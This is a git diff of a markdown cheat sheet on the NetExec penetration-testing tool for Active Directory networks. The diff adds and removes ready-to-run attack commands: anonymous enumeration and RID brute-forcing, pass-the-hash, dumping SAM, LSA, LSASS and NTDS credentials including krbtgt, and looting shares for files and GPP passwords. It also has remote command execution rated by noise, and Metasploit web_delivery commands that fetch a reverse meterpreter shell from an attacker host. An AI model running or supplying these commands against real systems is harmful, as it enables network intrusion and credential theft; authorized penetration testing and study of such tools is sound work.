@@ -5,30 +5,10 @@ title = "Netexec"
 - https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
     - Logs: `~/.nxc/logs/`
 - Cheatsheet: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
-- by default, `netxec` attempts to authenticate with passwords or hashes at the domain level... use `--local-auth` to force local authentication, since sometimes passwords and hashes are different at these levels
+- by default, `netxec` attempts to authenticate with passwords or hashes at the domain level... use `--local-auth` to force local authentication
     - **Note: ` --local-auth` NEVER works with DCs**
 
 Netexec (formerly CrackMapExec) is a swiss army knife for pentesting networks that helps automate assessing the security of large networks in AD environments. Netexec uses `impacket` libraries under its hood
-
-## Protocol Selection
-
-Netexec supports multiple protocols. Check available services with:
-
-```bash
-nxc -h
-```
-
-Common protocols include:
-- MSSQL
-- WINRM
-- LDAP
-- SMB
-- SSH
-- VNC
-- WMI
-- FTP
-- RDP
-- And sometimes more...
 
 ### Meaning of `Pwn3d!` per protocol
 
@@ -57,13 +37,17 @@ Usually only `smb` or `winrm` are "true" admin, but the rest usually include som
 
 ## Kerberos
 
-### Generating `Hosts` File
+### Generate `hosts` File
+
+For simple hostname to IP address resolution
 
 ```bash
 nxc smb <DC_IP> --generate-hosts-file nxc_hosts && sudo cp -v /etc/hosts /etc/hosts.bak_$(date +%Y-%m-%d_%H:%M:%S) && cat nxc_hosts | sudo tee -a /etc/hosts
 ```
 
 ### Generate `krb5.conf` File
+
+Configure host to talk to the KDC and to avoid `KRB_AP_ERR_SKEW` or "realm-not-found" errors (wrong KDC host, realm casing (**Kerberos realms are case-sensitive and usually uppercase**), etc.)
 
 ```bash
 nxc smb <DC_FQDN> --generate-krb5-file krb5.conf && sudo mv -v /etc/krb5.conf /etc/krb5.conf.bak && sudo cp -v krb5.conf /etc/krb5.conf
@@ -95,11 +79,6 @@ Only supports `proto` for `smb`, `mssql`, and `winrm`. Automatically saves colle
 ```bash
 # Enter database
 nxcdb
-
-# Workspaces
-workspace list
-workspace create <NAME>
-workspace <NAME>
 
 # Switch protocol
 proto smb
@@ -164,33 +143,12 @@ Single command covers users, groups, shares, and password policy via null/anonym
 ```bash
 nxc smb <TARGET> -u '' -p '' --users --shares --pass-pol --rid-brute 10000
 nxc ldap <DC_FQDN> -u '' -p '' --groups --computers
+
+# Parse out users from RID brute
+grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > nxc_users.txt
 ```
 
 ### User Enumeration
-
-#### Enumerate Users
-
-[Also check ASREPRoasting for finding users with wordlist](#asreproast)
-
-```bash
-# Enumerate users via SMB (anonymous)
-nxc smb <DC_IP> -u '' -p '' --users
-nxc smb <DC_IP> -u '' -p '' --rid-brute 10000 > nxc_rid_users.txt
-grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > nxc_users.txt
-
-# Authenticated user enumeration
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
-```
-
-#### Enumerate Groups
-
-```bash
-# Enumerate groups
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --groups
-
-# Find high value users (e.g., Domain Admins)
-nxc smb <TARGET> -u <USER> -p <PASSWORD> --groups "Domain Admins"
-```
 
 #### Logged-on Users and Sessions
 
@@ -200,54 +158,10 @@ Shows various logged on users... useful to dump their live creds
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --reg-sessions --loggedon-users --qwinsta
 ```
 
-#### Computers
-
-```bash
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --computers
-```
-
 ### Get machine IP address and domains
 
 ```bash
-# WMI
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M get_netconnections
-
-# RPC
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M ioxidresolver
-```
-
-### Shares Enumeration
-
-See [the spider_plus module for bulk downloading](#spider_plus)
-
-```bash
-# List available shares
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
-
-# Index all files across all shares (no download -- outputs JSON file list)
-nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" -M spider_plus
-cat /tmp/nxc_spider_plus/*.json | python3 -m json.tool
-```
-
-#### Download single file `smbclient`
-
-```bash
-smbclient //<TARGET>/<SHARE> -U '<USER>%<PASSWORD>' -c "get <FILE>"
-```
-
-### Pass the Hash (PtH)
-
-Netexec supports pass-the-hash attacks for lateral movement:
-
-```bash
-# Target can also be a subnet (CIDR)
-# -d . = Local Account | -d <DOMAIN> = Domain Account
-# --local-auth forces local check if implied domain fails
-# :<PASS_HASH> implies empty LM hash (LM:NT)
-nxc smb <TARGET> -u <USER> -d . --local-auth -H <PASS_HASH>
-
-# Domain account with hash
-nxc smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M get_netconnections -M ioxidresolver
 ```
 
 ### Credential Dumping
@@ -259,43 +173,22 @@ nxc smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
 | **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows -- this placeholder appears for every user. Ignore it.               |
 | **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                   |
 
-#### SAM Database `--sam`
+#### Registry Secrets `--sam` and `--lsa`
 
-SAM database secrets in `HKLM\SAM`. Works on any Windows host.
-
-```bash
-# Dump SAM secrets remotely
-nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
-```
-
-#### LSA Secrets `--lsa`
-
-LSA domain and other secrets in `HKLM\SECURITY`. [Gives DCC2 hashes which are only crackable -- not passable.]({{% ref "hashcat.md#windows-hashes" %}})
+SAM database secrets in `HKLM\SAM`. LSA domain and other secrets in `HKLM\SECURITY`;  [gives DCC2 hashes which are only crackable: not passable.]({{% ref "hashcat.md#windows-hashes" %}})
 
 ```bash
-# Dump LSA secrets remotely
-nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
+nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam --lsa
 ```
 
 #### LSASS Dump
 
+- https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-lsass
+
 Active session hashes (or cleartest passwords) from process memory of `lsass.exe`
 
 ```bash
-# nanodump (stealthiest -- clones existing handles)
-# NOTE: creates file on target
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M nanodump
-
-# procdump (noisiest -- drops Sysinternals binary)
-# NOTE: creates file on target
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M procdump
-
-# lsassy (fileless, fast)
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy
-
-# handlekatz (obfuscated dump via cloned handles)
-# NOTE: creates file on target
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M handlekatz
+nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy -M nanodump -M procdump -M handlekatz
 ```
 
 #### NTDS Dump
@@ -304,22 +197,21 @@ nxc smb <TARGET> -u <USER> -p '<PASS>' -M handlekatz
 - **NOTE:** this can sometimes crash the DC:
     - https://github.com/Pennyw0rth/NetExec/discussions/329#discussioncomment-9594340
 
-To dump **one** account instead, add `--ntds --user <USER>`:
+
+**Full dump with history and timestamps and Kerberos keys**
 ```bash
-# Dump a specific user only (NTDS hash extraction scoped to one account)
+nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --history --kerberos-keys
+```
+
+**Dump one account instead**
+```bash
 nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user Administrator
 nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
 ```
 
 **Server 2019+**
 ```bash
-# Extract NTDS.dit (copies NTDS.dit then parses it)
 nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
-```
-
-**Full dump with history and timestamps and Kerberos keys**
-```bash
-nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --history --kerberos-keys
 ```
 
 ### Uploading and Getting Files
@@ -338,7 +230,7 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --get-file '<FULL
 netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file <IN_FILE> '<FULL_FILE_PATH>'
 ```
 
-### `spider`
+#### `spider`
 
 **Search for filename PATTERN like `password`**
 ```bash
@@ -355,39 +247,25 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --rege
 netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
 ```
 
-### `spider_plus`
+#### `spider_plus`
 
-Download all files from all shares except the excluded defaults; max file size `2 MB`
+Bulk download all files from all shares except the excluded defaults; max file size `2 MB`
 
 ```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/my_data/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 2)) EXCLUDE_FILTER='admin$,c$,ipc$,print$'
+nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/my_data/nxc_spider MAX_FILE_SIZE=$((2 * 1024 * 1024)) EXCLUDE_FILTER='admin$,c$,ipc$,print$'
 ```
 
-### `gpp_password`
+### `gpp_password` and `gpp_autologin`
 
 - https://adsecurity.org/?p=2288
 
-**NOTE:** Usually for DCs
-
-Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP)
+**On DC only**, retrieves the plaintext password through Group Policy Preferences (GPP). Searches for `registry.xml` files to find autologin information (creds)
 
 ```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password
-```
-
-### `gpp_autologin`
-
-**NOTE:** Usually for DCs
-
-Searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present
-
-```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin
+nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password -M gpp_autologin
 ```
 
 ### KeePass collection
-
-**NOTE:** reminder to clean trigger
 
 ```bash
 # Find configs and database files
@@ -445,25 +323,11 @@ nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M scuffy -o SERVER=<ATTACKER_IP> NAME
 
 - https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
 
-Triage a DC for unpatched critical vulnerabilities. For exploitation see [DC Vulnerability Attacks]({{% ref "active-directory.md#dc-vulnerability-attacks" %}}).
-
-### No creds required
+Triage a DC for unpatched critical vulnerabilities.
 
 ```bash
-nxc smb <DC_IP> -M zerologon
-nxc smb <DC_IP> -M ms17-010
-```
-
-### noPAC
-
-```bash
-nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M nopac
-```
-
-### PrintNightmare
-
-```bash
-nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M printnightmare
+# No creds required
+nxc smb <DC_IP> -M zerologon -M ms17-010
 ```
 
 ### Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven
@@ -515,11 +379,7 @@ netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-network -o ALL=true
 Both modules dump user descriptions for the accounts.
 
 ```bash
-# Dump ones likely with passwords
-nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M user-desc
-
-# Dump all
-nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-desc-users
+nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-desc-users -M user-desc
 ```
 
 ### `groupmembership`
@@ -697,12 +557,12 @@ reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
 | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` | `0` or **Absent** | Only RID 500 (built-in Admin) can exec remotely | **All** LOCAL (not domain) admins can exec remotely |
 | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`      | `0` or **Absent** | RID 500 can exec remotely                       | RID 500 **blocked** from remote exec                |
 
-| `--exec-method` (SMB only) | Protocol | How                                                                        | Noise  | Port |
-| -------------------------- | -------- | -------------------------------------------------------------------------- | ------ | ---- |
-| `wmiexec` (default)        | WMI      | WMI process create (file written to disk)                                  | Lower  | 135  |
-| `atexec`                   | SMB      | Scheduled task (fileless -- not working on more modern Windows)            | Lower  | 445  |
-| `smbexec`                  | SMB      | Creates a Windows service (fileless -- not working on more modern Windows) | Medium | 445  |
-| `mmcexec`                  | DCOM     | similar to `wmiexec` but through Microsoft Management Console (MMC)        | Lowest | 135  |
+| `--exec-method` (SMB only) | Protocol | How                                                | Noise  | Port        |
+| -------------------------- | -------- | -------------------------------------------------- | ------ | ----------- |
+| `wmiexec` (default)        | WMI      | WMI process create; output via temp file on ADMIN$ | Medium | 135+445+RHP |
+| `atexec`                   | SMB      | Scheduled task (unreliable on modern Windows)      | Lower  | 445         |
+| `smbexec`                  | SMB      | Creates a Windows service                          | Medium | 445         |
+| `mmcexec`                  | DCOM     | Creates a Windows service                          | Lowest | 135+445+RHP |
 
 ```bash
 # cmd.exe
@@ -711,41 +571,3 @@ sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -x '<COMMAND>'
 # PowerShell
 sudo nxc smb <TARGET> -u <USER> -p <PASSWORD> -X '<COMMAND>'
 ```
-
-### via Metasploit
-
-- https://www.netexec.wiki/smb-protocol/command-execution/getting-shells-101#meterpreter
-- **NOTE:** still requires command execution (see above)... try switching protocols like `winrm`
-
-```bash
-# web_delivery
-sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST <INTERFACE>; set LPORT 50000; set SRVPORT 8080; exploit"
-
-# Grab RAND from MSF output then:
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M web_delivery -o PAYLOAD=64 URL="http://<ATTACKER_IP>:8080/<RAND>"
-```
-
-```bash
-# met_inject
-sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set payload windows/meterpreter/reverse_https; set LHOST <INTERFACE>; set LPORT 50000; set SRVPORT 8080; exploit"
-
-# Grab RAND from MSF output then:
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M met_inject -o SRVPORT=8080 SSL=true SRVHOST=<ATTACKER_IP> RAND=<RAND_STRING>
-```
-
-### Collecting AD info via BloodHound
-
-[See for more info to integrate `netexec` and BloodHound]({{% ref "bloodhound.md" %}}).
-
-```bash
-# Upload collector
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --put-file SharpHound.exe C:\\windows\\temp\\SharpHound.exe
-
-# Run collector
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -x "C:\windows\temp\SharpHound.exe -c All --OutputDirectory C:\windows\temp"
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -x "dir c:\windows\temp\*_BloodHound.zip"
-
-# Download logs
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --get-file \\windows\\temp\\<BLOODHOUND_LOGS>.zip BloodHound_logs.zip
-```
-
